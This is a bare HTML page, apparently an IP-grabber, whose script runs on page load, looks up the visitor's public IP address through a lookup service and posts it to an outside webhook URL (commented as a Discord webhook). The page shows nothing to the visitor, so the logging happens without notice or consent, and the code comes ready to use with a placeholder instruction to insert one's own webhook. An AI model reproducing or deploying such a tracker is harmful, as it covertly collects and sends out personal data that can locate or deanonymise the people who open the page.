<!DOCTYPE html>
<html>
<body>
<script>
async function logIP(webhookURL) {
  // Get the user's IP address
  const response = await fetch('https://api.ipify.org?format=json');
  const {ip} = await response.json();
  // Send the IP address to the Discord webhook
  const data = {
    "content": `New IP logged: ${ip}`
  };
  await fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  });
}
// Replace WEBHOOK_URL with your actual Discord webhook URL
const WEBHOOK_URL = 'https://api.botghost.com/webhook/1180245729688686714/e02eh1r2pqr2ijl7ax7jky';
logIP(WEBHOOK_URL);
</script>
</body>
</html>
